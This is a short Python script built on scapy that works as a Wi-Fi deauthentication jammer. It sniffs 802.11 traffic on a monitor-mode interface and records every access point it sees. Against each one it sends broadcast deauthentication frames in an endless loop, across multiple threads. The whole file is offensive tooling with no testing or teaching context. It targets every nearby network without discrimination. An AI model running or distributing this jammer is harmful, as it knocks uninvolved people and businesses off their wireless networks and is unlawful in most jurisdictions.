from scapy.all import *
import threading
from queue import Queue

jobs = [1, 2]
iface = 'wlan0mon'
thread_num = 12
q = Queue()

bc = []
wifi = []
dont_rep = []

def scan_area():
    while True:
        try:
            for pack in sniff(iface=iface, count=1):
                if pack.haslayer(Dot11):
                    ssid = pack.getlayer(Dot11).info
                    bssid = pack.getlayer(Dot11).addr2
                    if str(bssid) not in wifi:
                        print '[=]' + str(ssid) + ' --- ' + str(bssid)
                        wifi.append(str(bssid)), '\n'
                        jammer(str(bssid))
        except:
            pass


def beacons():
    while True:
        for pack in sniff(iface=iface, count=1):
            if pack.haslayer(Dot11Beacon):
                if pack.addr2 not in bc:
                    bc.append(pack.addr2)
                    print '[+] Beacon ', pack.info, '  ', pack.addr2, '\n'



def jammer(mac):
    print '[+] Jamming ', mac
    frame = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac) / Dot11Deauth()
    sendp(frame, iface=iface, inter=.1, verbose=False, loop=1)
def create_worker():
    for i in range(thread_num):
        t = threading.Thread(target=work, args=())
        t.daemon = True
        t.start()


def work():
    x = q.get()
    for works in range(x+1):
        scan_area()

    q.task_done()


def create_jobs():
    for nums in range(thread_num):
        q.put(nums)

    q.join()


def main():
    create_worker()
    create_jobs()


main()
